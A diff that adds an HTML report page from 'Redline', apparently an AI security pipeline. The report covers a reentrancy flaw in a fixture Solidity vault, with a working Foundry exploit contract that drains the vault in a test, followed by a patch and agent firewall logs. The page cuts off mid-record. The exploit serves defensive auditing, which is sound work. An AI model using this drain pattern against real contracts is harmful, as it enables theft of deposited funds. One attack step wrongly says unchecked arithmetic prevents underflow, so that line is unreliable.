@@ -1,0 +1,477 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Redline - vulnerable-vault-8a3e99</title><style>:root {
+  --bg: #0a0c0f; --panel: #11151a; --panel2: #161b22; --line: #232a33; --text: #d9dde3; --muted: #8b939e;
+  --red: #ff4d4f; --red-bg: rgba(255, 77, 79, .12); --green: #3ecf8e; --green-bg: rgba(62, 207, 142, .12);
+  --amber: #c9a227; --grey: #6b7380;
+  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+  --sans: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.5 var(--sans); }
+code, .mono { font-family: var(--mono); font-size: .88em; }
+.muted { color: var(--muted); } .small { font-size: .85em; }
+h1 { font-size: 1.25rem; margin: 0; } h2 { font-size: 1rem; margin: 22px 0 10px; letter-spacing: .06em; text-transform: uppercase; color: var(--muted); }
+h2 small, h4 small { text-transform: none; letter-spacing: 0; font-weight: 400; margin-left: 6px; }
+h4 { margin: 16px 0 6px; font-size: .8rem; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); }
+p { margin: 8px 0; }
+a { color: #8ab4ff; }
+
+.top { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 10px 16px; border-bottom: 1px solid var(--line); background: var(--bg); }
+.brand { font-weight: 700; letter-spacing: .18em; font-size: .9rem; } .logo { color: var(--red); margin-right: 4px; }
+.ctl { display: flex; gap: 8px; min-width: 0; }
+select, button { background: var(--panel2); color: var(--text); border: 1px solid var(--line); border-radius: 6px; padding: 7px 10px; font: inherit; font-size: .85rem; min-width: 0; }
+select { max-width: 52vw; } button { cursor: pointer; } button:hover { border-color: var(--grey); }
+.tabs { position: sticky; top: 0; z-index: 5; display: flex; background: var(--bg); border-bottom: 1px solid var(--line); padding: 0 8px; }
+.tabs button { flex: 1; background: none; border: 0; border-bottom: 2px solid transparent; border-radius: 0; padding: 12px 6px; color: var(--muted); font-size: .9rem; }
+.tabs button.on { color: var(--text); border-bottom-color: var(--red); }
+main { max-width: 1680px; margin: 0 auto; padding: 14px 16px 60px; }
+
+.banner { border: 1px dashed var(--amber); background: rgba(201, 162, 39, .08); color: #e6d28a; border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; font-size: .88rem; }
+.banner b { color: #ffe27a; }
+
+.hdr { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px; margin-bottom: 14px; }
+.hdr-top { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
+.pill { font-size: .72rem; padding: 2px 9px; border-radius: 99px; border: 1px solid var(--line); text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+.pill.running { color: var(--amber); border-color: var(--amber); } .pill.finished { color: var(--green); border-color: var(--green); } .pill.failed { color: var(--red); border-color: var(--red); }
+.stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+.stat .k { font-size: .7rem; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+.stat .v { font-family: var(--mono); font-size: 1.05rem; overflow-wrap: anywhere; } .stat .v small { font-size: .65rem; color: var(--muted); font-family: var(--sans); }
+.stat.red .v { color: var(--red); } .stat.green .v { color: var(--green); }
+
+.stepper { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 8px; }
+.step { display: flex; align-items: center; gap: 8px; background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; }
+.step .dot { width: 24px; height: 24px; flex: none; border-radius: 50%; display: grid; place-items: center; font-size: .75rem; border: 1px solid var(--grey); color: var(--muted); }
+.step .lbl { font-size: .88rem; line-height: 1.15; } .step small { display: block; color: var(--muted); font-size: .72rem; }
+.step.running { border-color: var(--amber); } .step.running .dot { border-color: var(--amber); color: var(--amber); animation: pulse 1.1s infinite; }
+.step.ok .dot { background: var(--green-bg); border-color: var(--green); color: var(--green); }
+.step.fail .dot { background: var(--red-bg); border-color: var(--red); color: var(--red); }
+@keyframes pulse { 50% { box-shadow: 0 0 0 5px rgba(201, 162, 39, .18); } }
+
+.cols { display: grid; grid-template-columns: 1fr; gap: 0 22px; }
+.card { background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--grey); border-radius: 8px; padding: 12px 14px; margin-bottom: 12px; }
+.card.red { border-left-color: var(--red); } .card.amber { border-left-color: var(--amber); }
+.row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+.sev, .chip, .mini { font-size: .68rem; text-transform: uppercase; letter-spacing: .07em; padding: 2px 8px; border-radius: 99px; border: 1px solid var(--line); color: var(--muted); white-space: nowrap; }
+.sev-critical, .sev-high { color: var(--red); border-color: var(--red); } .sev-medium { color: var(--amber); border-color: var(--amber); }
+.chip.red { color: var(--red); border-color: var(--red); background: var(--red-bg); } .chip.green { color: var(--green); border-color: var(--green); background: var(--green-bg); }
+.chip.amber { color: var(--amber); border-color: var(--amber); } .chip.lay { font-family: var(--mono); }
+.row .chip { margin-left: auto; }
+.minis { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin-top: 6px; }
+.mini.running { color: var(--amber); border-color: var(--amber); } .mini.ok { color: var(--green); border-color: var(--green); } .mini.fail { color: var(--red); border-color: var(--red); }
+.empty { color: var(--muted); border: 1px dashed var(--line); border-radius: 8px; padding: 14px; text-align: center; margin-bottom: 12px; }
+
+.feed { display: flex; flex-direction: column; gap: 6px; }
+.fw { display: grid; grid-template-columns: auto auto 1fr; gap: 4px 8px; align-items: center; background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--green); border-radius: 6px; padding: 7px 10px; font-size: .84rem; }
+.fw.deny { border-left-color: var(--red); background: linear-gradient(90deg, var(--red-bg), var(--panel) 60%); }
+.fw .vd { font-family: var(--mono); font-weight: 700; font-size: .75rem; color: var(--green); } .fw.deny .vd { color: var(--red); }
+.fw .act { overflow-wrap: anywhere; } .fw .why, .fw .meta { grid-column: 1 / -1; color: var(--muted); font-size: .8rem; } .fw.deny .why { color: #f0a0a1; }
+
+pre.code { margin: 6px 0; background: #0d1014; border: 1px solid var(--line); border-radius: 6px; padding: 10px 12px; overflow-x: auto; font: 12.5px/1.5 var(--mono); max-height: 460px; }
+.tk-c { color: #6c7a89; } .tk-s { color: #b8d98a; } .tk-n { color: #e5a96b; } .tk-k { color: #c792ea; } .tk-t { color: #7fc8e8; }
+.df-a { color: var(--green); background: var(--green-bg); display: inline-block; width: 100%; } .df-d { color: var(--red); background: var(--red-bg); display: inline-block; width: 100%; } .df-h { color: var(--muted); }
+details { margin: 6px 0; } summary { cursor: pointer; padding: 3px 0; }
+
+.ba { display: flex; align-items: stretch; gap: 8px; margin: 10px 0; }
+.ba-box { flex: 1; border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; }
+.ba-box.red { border-color: var(--red); background: var(--red-bg); } .ba-box.green { border-color: var(--green); background: var(--green-bg); }
+.ba-box .k { font-size: .68rem; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); } .ba-box .v { font-size: .86rem; }
+.arrow { align-self: center; color: var(--muted); }
+.cites { padding-left: 18px; margin: 4px 0; } .cites li { margin-bottom: 8px; }
+
+.qfile { margin-bottom: 16px; } .qname { margin-bottom: 4px; }
+.qsrc { white-space: pre; } .qsrc .ln { display: inline-block; width: 3ch; margin-right: 1.2ch; text-align: right; color: #4d5663; user-select: none; }
+.qhit { background: var(--red-bg); color: #ffb4b5; box-shadow: inset 2px 0 0 var(--red); display: inline-block; width: calc(100% - 4.2ch); }
+.tablewrap { overflow-x: auto; } table { width: 100%; border-collapse: collapse; font-size: .86rem; }
+th, td { text-align: left; padding: 7px 10px; border-bottom: 1px solid var(--line); white-space: nowrap; } th { color: var(--muted); font-weight: 500; font-size: .75rem; text-transform: uppercase; letter-spacing: .06em; }
+.barcell { width: 40%; } .bar { height: 8px; background: var(--grey); border-radius: 4px; }
+
+@media (min-width: 760px) {
+  .stats { grid-template-columns: repeat(5, 1fr); } .stepper { grid-template-columns: repeat(6, 1fr); }
+  .fw { grid-template-columns: auto auto 1fr auto; } .fw .why { grid-column: 3 / 4; grid-row: 2; } .fw .meta { grid-column: 4; grid-row: 1 / 3; text-align: right; align-self: center; }
+}
+@media (min-width: 1100px) {
+  body { font-size: 16px; } main { padding: 22px 32px 80px; }
+  .cols { grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); } .stats { grid-template-columns: repeat(9, auto); justify-content: space-between; }
+  .tabs { max-width: 1680px; margin: 0 auto; } .tabs button { flex: none; padding: 12px 26px; }
+}
+
+.auditform { display: flex; gap: 8px; padding: 10px 16px 0; max-width: 900px; margin: 0 auto; }
+.auditform input { flex: 1; min-width: 0; padding: 9px 11px; border: 1px solid #333; border-radius: 6px; background: #14141a; color: inherit; font: inherit; }
+.auditform button { padding: 9px 16px; border: 0; border-radius: 6px; background: #e5484d; color: #fff; font: inherit; cursor: pointer; }
+.auditform button:disabled { opacity: .5; cursor: wait; }
+.auditmsg { padding: 4px 16px 0; max-width: 900px; margin: 0 auto; font-size: .85em; opacity: .8; min-height: 1.2em; }
+.auditmsg.err { color: #ff6b6b; opacity: 1; }
+</style></head><body><div id="app"></div><script>window.__REDLINE_DATA__ = {"id": "vulnerable-vault-8a3e99", "report": {"run_id": "vulnerable-vault-8a3e99", "repo": "fixtures/vulnerable-vault", "provider": "nvidia", "findings": [{"finding": {"id": "F1", "title": "Reentrancy in withdraw() allows draining the vault", "severity": "critical", "file": "src/Vault.sol", "function": "withdraw", "description": "The withdraw function performs the external call (msg.sender.call) before updating the user's balance. A malicious contract can re-enter withdraw() during the call, pass the balance check again, and withdraw repeatedly until the vault is empty.", "attack": "1. Attacker deploys a contract with a fallback that calls vault.withdraw() again.\n2. Attacker deposits 1 ETH into the vault.\n3. Attacker calls withdraw(1 ETH).\n4. Vault checks balance (1 ETH >= 1 ETH), then sends 1 ETH to attacker's contract.\n5. Attacker's fallback triggers, calls withdraw(1 ETH) again.\n6. Vault balance check still passes (balance not yet decremented), sends another 1 ETH.\n7. Loop repeats until vault balance is exhausted.\n8. After the external calls return, the unchecked balance decrements execute but underflow is prevented by unchecked arithmetic, leaving balances corrupted.", "confidence": 0.99}, "citations": [{"title": "SC08:2026 Reentrancy Attacks - OWASP Smart Contract Security", "url": "https://scs.owasp.org/sctop10/SC08-ReentrancyAttacks", "snippet": "GMX V1 contracts were exploited via a classic yet sophisticated reentrancy vector in `executeDecreaseOrder`. The function accepted the attacker's smart contract address as a parameter; when it transferred control to that address during the refund process, the attacker re-entered and manipulated global average short prices, AUM, and GLP valuations. State updates after external calls and lack of ree"}, {"title": "Reentrancy Attack: Risks, Impact, And Prevention In Smart Contracts - Hacken", "url": "https://hacken.io/discover/reentrancy-attacks", "snippet": "A reentrancy attack is a type of vulnerability exploit where an attacker leverages an unsynchronized state during an external contract call. This allows for repeated execution of actions intended to occur only once, potentially resulting in unauthorized state alterations and actions, such as excessive fund withdrawals. [...] Here we see that withdraw function has a reentrancy vulnerability. Howeve"}, {"title": "How Hackers Drain Smart Contracts: The Reentrancy Attack That Stole $60M | by Ancilar | Blockchain Services | Medium", "url": "https://medium.com/@ancilartech/how-hackers-drain-smart-contracts-the-reentrancy-attack-that-stole-60m-360ae43e88d1", "snippet": "When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract\u2019s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.\n\n## How Does Reentrancy Attack Work?\n\nA reentrancy attack involves two smart contracts. A vulnerable contract and an untrusted attacker\u2019s contra"}, {"title": "Understanding Re-entrancy in Smart Contracts \u2013 SolidityScan Blogs", "url": "https://blog.solidityscan.com/understanding-re-entrancy-in-smart-contracts-97cb67ecbb07", "snippet": "The reentrancy technique may prove a huge vulnerability for your Solidity smart contracts. It transfers the control flow to an untrusted contract that intends to drain funds. Let us explore it in detail. [...] #### Example 1\n\n```\nfunction withdraw() external {  \n uint256 amount = balances[msg.sender];  \n require(msg.sender.call.value(amount)());  \n balances[msg.sender] = 0;  \n}\n```\n\nThe attacker e"}], "poc": {"confirmed": true, "attempts": 1, "test_file": "test/Exploit_F1.t.sol", "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract ReentrancyAttacker {\n    address public immutable vault;\n    uint256 public immutable amount;\n\n    constructor(address _vault, uint256 _amount) {\n        vault = _vault;\n        amount = _amount;\n    }\n\n    function deposit() external payable {\n        Vault(vault).deposit{value: msg.value}();\n    }\n\n    receive() external payable {\n        // Re-enter withdraw while the vault still holds ETH. The vault does\n        // not decrement balances[msg.sender] until after the external call,\n        // so the balance check keeps passing.\n        if (address(vault).balance >= amount) {\n            Vault(vault).withdraw(amount);\n        }\n    }\n\n    function attack() external payable {\n        Vault(vault).withdraw(amount);\n    }\n\n    function sweep() external {\n        (bool ok,) = payable(msg.sender).call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n}\n\ncontract VaultTest is Test {\n    Vault public vault;\n    address public immutable attacker = address(0x1234);\n    address public immutable victim = address(0x5678);\n\n    function setUp() public {\n        vault = new Vault();\n    }\n\n    function test_exploit() public {\n        uint256 victimDeposit = 20 ether;\n        uint256 attackerDeposit = 1 ether;\n        uint256 amount = 1 ether;\n\n        // Fund the parties so they can deposit real ETH.\n        vm.deal(victim, victimDeposit);\n        vm.deal(attacker, attackerDeposit);\n\n        // Victim deposits into the vault.\n        vm.prank(victim);\n        vault.deposit{value: victimDeposit}();\n\n        // Deploy the attacker contract and fund it.\n        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(vault), amount);\n        vm.deal(address(attackerContract), attackerDeposit);\n\n        // Attacker contract deposits into the vault so balances[attackerContract] > 0.\n        vm.prank(address(attackerContract));\n        attackerContract.deposit{value: attackerDeposit}();\n\n        uint256 initialVaultAssets = vault.totalAssets();\n        assertEq(initialVaultAssets, victimDeposit + attackerDeposit);\n\n        // Initiate the reentrancy exploit.\n        vm.prank(address(attackerContract));\n        attackerContract.attack();\n\n        // The vault should be fully drained.\n        assertEq(vault.totalAssets(), 0);\n\n        // Attacker sweeps the drained funds to themselves.\n        vm.prank(attacker);\n        attackerContract.sweep();\n\n        // Concrete harm: attacker ends with far more than the 1 ETH they deposited.\n        assertGt(attacker.balance, attackerDeposit);\n    }\n}", "output": "[PASS] VaultTest.test_exploit()", "note": ""}, "patch": {"applied": true, "attempts": 1, "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,14 +11,14 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n-        (bool ok,) = msg.sender.call{value: amount}(\"\");\n-        require(ok, \"transfer failed\");\n         unchecked {\n             balances[msg.sender] -= amount;\n         }\n+        (bool ok,) = msg.sender.call{value: amount}(\"\");\n+        require(ok, \"transfer failed\");\n     }\n \n     function totalAssets() external view returns (uint256) {\n         return address(this).balance;\n     }\n-}\n+}", "poc_blocked": true, "suite_green": true, "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"30ms 398\u00b5s 790ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"5ms 382\u00b5s 674ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112679}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"1ms 571\u00b5s 232ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n", "note": "Reordered withdraw() to follow checks-effects-interactions: the user's balance is decremented before the external call, so a re-entrant withdraw() will fail the balance check and revert instead of draining the vault."}, "status": "confirmed"}], "quarantined": [], "quarantine_files": {}, "firewall_log": [{"ts": 1793264274.987962, "kind": "shell", "action": "forge test", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 0.1, "provider": ""}, {"ts": 1793264280.8311813, "kind": "read", "action": "README.md", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 4.74, "provider": ""}, {"ts": 1793264285.9127421, "kind": "read", "action": "foundry.toml", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 18.71, "provider": ""}, {"ts": 1793264286.348144, "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 1.37, "provider": ""}, {"ts": 1793264287.886936, "kind": "read", "action": "test/Vault.t.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 0.62, "provider": ""}, {"ts": 1793264552.137999, "kind": "net", "action": "https://api.tavily.com/search", "verdict": "allow", "layer": "L1", "rule": "net-allowlist", "reason": "api.tavily.com allowlisted", "confidence": 1.0, "latency_ms": 8.36, "provider": ""}, {"ts": 1793264552.7149556, "kind": "net", "action": "https://api.tavily.com/search", "verdict": "allow", "layer": "L2", "rule": "nemotron-policy", "reason": "Web search for public exploit write-ups via Tavily is an allowed part of the web research stage.", "confidence": 1.0, "latency_ms": 563.34, "provider": "nvidia"}, {"ts": 1793264682.3955438, "kind": "write", "action": "test/Exploit_F1.t.sol (2678B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 60.0, "provider": ""}, {"ts": 1793264682.4273767, "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 3.8, "provider": ""}, {"ts": 1793264696.7326226, "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 23.13, "provider": ""}, {"ts": 1793264712.0900054, "kind": "write", "action": "src/Vault.sol (651B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 37.18, "provider": ""}, {"ts": 1793264712.1240845, "kind": "write", "action": "src/Vault.sol (651B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 0.21, "provider": ""}, {"ts": 1793264712.1373367, "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 10.51, "provider": ""}, {"ts": 1793264728.8861854, "kind": "shell", "action": "forge test --no-match-path test/Exploit_F1.t.sol", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 31.67, "provider": ""}, {"ts": 1793264737.7103171, "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 25.99, "provider": ""}], "calls": [{"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 314, "completion_tokens": 16, "latency_s": 4.987729197368026}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 343, "completion_tokens": 16, "latency_s": 0.40694166626781225}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 531, "completion_tokens": 16, "latency_s": 0.231823923997581}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 642, "completion_tokens": 15, "latency_s": 0.2166677312925458}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "recon", "prompt_tokens": 742, "completion_tokens": 6000, "latency_s": 45.6105215344578}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "recon", "prompt_tokens": 784, "completion_tokens": 6000, "latency_s": 63.28576493822038}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "recon", "prompt_tokens": 826, "completion_tokens": 6000, "latency_s": 115.24247135035694}, {"provider": "nvidia", "model": "nvidia/nemotron-3-ultra-550b-a55b", "role": "recon-fallback", "prompt_tokens": 742, "completion_tokens": 888, "latency_s": 36.64409021101892}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "policy", "prompt_tokens": 316, "completion_tokens": 41, "latency_s": 0.5586385866627097}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 377, "completion_tokens": 16, "latency_s": 0.6638729562982917}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 517, "completion_tokens": 30, "latency_s": 0.45460997242480516}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 533, "completion_tokens": 72, "latency_s": 1.091273557394743}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "role": "scanner", "prompt_tokens": 616, "completion_tokens": 33, "latency_s": 0.6484814248979092}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "exploit", "prompt_tokens": 758, "completion_tokens": 13023, "latency_s": 119.91252851858735}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "patch", "prompt_tokens": 1270, "completion_tokens": 1010, "latency_s": 7.7272834572941065}, {"provider": "nvidia", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "role": "patch", "prompt_tokens": 1573, "completion_tokens": 1087, "latency_s": 7.522716545499861}], "baseline_green": true, "elapsed_s": 462.8825976662338, "out_dir": "/root/redline/jobs/vulnerable-vault-8a3e99", "scripted": false, "label": "", "models": {"main": "nvidia/nemotron-3.5-super-vl-120b-a12b", "firewall": "nvidia/nemotron-3.5-lightning-30b-a3b"}}, "events": [{"seq": 1, "ts": 1793264274.9832935, "type": "run_started", "run_id": "vulnerable-vault-8a3e99", "repo": "vulnerable-vault", "provider": "nvidia", "models": {"main": "nvidia/nemotron-3.5-super-vl-120b-a12b", "firewall": "nvidia/nemotron-3.5-lightning-30b-a3b"}, "scripted": false, "label": ""}, {"seq": 2, "ts": 1793264274.9877067, "type": "stage_started", "stage": "baseline", "finding_id": ""}, {"seq": 3, "ts": 1793264274.9881248, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 0.098, "provider": ""}, {"seq": 4, "ts": 1793264280.500809, "type": "stage_finished", "stage": "baseline", "finding_id": "", "ok": true, "duration_s": 5.509, "detail": "2 tests, all green=True", "citations": []}, {"seq": 5, "ts": 1793264280.6292439, "type": "stage_started", "stage": "scan", "finding_id": ""}, {"seq": 6, "ts": 1793264280.8402965, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "README.md", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 4.738, "provider": ""}, {"seq": 7, "ts": 1793264285.9220982, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "foundry.toml", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 18.707, "provider": ""}, {"seq": 8, "ts": 1793264286.348593, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 1.367, "provider": ""}, {"seq": 9, "ts": 1793264287.887149, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "test/Vault.t.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 0.621, "provider": ""}, {"seq": 10, "ts": 1793264289.589751, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 314, "completion_tokens": 16, "latency_s": 4.988}, {"seq": 11, "ts": 1793264289.5958254, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 343, "completion_tokens": 16, "latency_s": 0.407}, {"seq": 12, "ts": 1793264289.595931, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 531, "completion_tokens": 16, "latency_s": 0.232}, {"seq": 13, "ts": 1793264289.5959923, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 642, "completion_tokens": 15, "latency_s": 0.217}, {"seq": 14, "ts": 1793264289.599069, "type": "stage_finished", "stage": "scan", "finding_id": "", "ok": true, "duration_s": 8.969, "detail": "4 files, 0 span(s) quarantined", "citations": []}, {"seq": 15, "ts": 1793264289.6494322, "type": "stage_started", "stage": "recon", "finding_id": ""}, {"seq": 16, "ts": 1793264551.983185, "type": "llm_call", "role": "recon", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 742, "completion_tokens": 6000, "latency_s": 45.611}, {"seq": 17, "ts": 1793264552.0235386, "type": "llm_call", "role": "recon", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 784, "completion_tokens": 6000, "latency_s": 63.286}, {"seq": 18, "ts": 1793264552.0317569, "type": "llm_call", "role": "recon", "model": "nvidia/nemotron-3.5-super-vl-120b-a12b", "provider": "nvidia", "prompt_tokens": 826, "completion_tokens": 6000, "latency_s": 115.242}, {"seq": 19, "ts": 1793264552.031931, "type": "llm_call", "role": "recon-fallback", "model": "nvidia/nemotron-3-ultra-550b-a55b", "provider": "nvidia", "prompt_tokens": 742, "completion_tokens": 888, "latency_s": 36.644}, {"seq": 20, "ts": 1793264552.0472343, "type": "stage_finished", "stage": "recon", "finding_id": "", "ok": true, "duration_s": 262.391, "detail": "1 suspected finding(s)", "citations": []}, {"seq": 21, "ts": 1793264552.1032789, "type": "finding_added", "finding": {"id": "F1", "title": "Reentrancy in withdraw() allows draining the vault", "severity": "critical", "file": "src/Vault.sol", "function": "withdraw", "description": "The withdraw function performs the external call (msg.sender.call) before updating the user's balance. A malicious contract can re-enter withdraw() during the call, pass the balance check again, and withdraw repeatedly until the vault is empty.", "attack": "1. Attacker deploys a contract with a fallback that calls vault.withdraw() again.\n2. Attacker deposits 1 ETH into the vault.\n3. Attacker calls withdraw(1 ETH).\n4. Vault checks balance (1 ETH >= 1 ETH), then sends 1 ETH to attacker's contract.\n5. Attacker's fallback triggers, calls withdraw(1 ETH) again.\n6. Vault balance check still passes (balance not yet decremented), sends another 1 ETH.\n7. Loop repeats until vault balance is exhausted.\n8. After the external calls return, the unchecked balance decrements execute but underflow is prevented by unchecked arithmetic, leaving balances corrupted.", "confidence": 0.99}}, {"seq": 22, "ts": 1793264552.122559, "type": "stage_started", "stage": "research", "finding_id": "F1"}, {"seq": 23, "ts": 1793264552.1443627, "type": "firewall_decision", "layer": "L1", "kind": "net", "action": "https://api.tavily.com/search", "verdict": "allow", "rule": "net-allowlist", "reason": "api.tavily.com allowlisted", "latency_ms": 8.365, "provider": ""}, {"seq": 24, "ts": 1793264552.71515, "type": "firewall_decision", "layer": "L2", "kind": "net", "action": "https://api.tavily.com/search", "verdict": "allow", "rule": "nemotron-policy", "reason": "Web search for public exploit write-ups via Tavily is an allowed part of the web research stage.", "latency_ms": 563.343, "provider": "nvidia"}, {"seq": 25, "ts": 1793264561.3585496, "type": "llm_call", "role": "policy", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 316, "completion_tokens": 41, "latency_s": 0.559}, {"seq": 26, "ts": 1793264561.403384, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 377, "completion_tokens": 16, "latency_s": 0.664}, {"seq": 27, "ts": 1793264561.4042957, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 517, "completion_tokens": 30, "latency_s": 0.455}, {"seq": 28, "ts": 1793264561.4043882, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 533, "completion_tokens": 72, "latency_s": 1.091}, {"seq": 29, "ts": 1793264561.404424, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-3.5-lightning-30b-a3b", "provider": "nvidia", "prompt_tokens": 616, 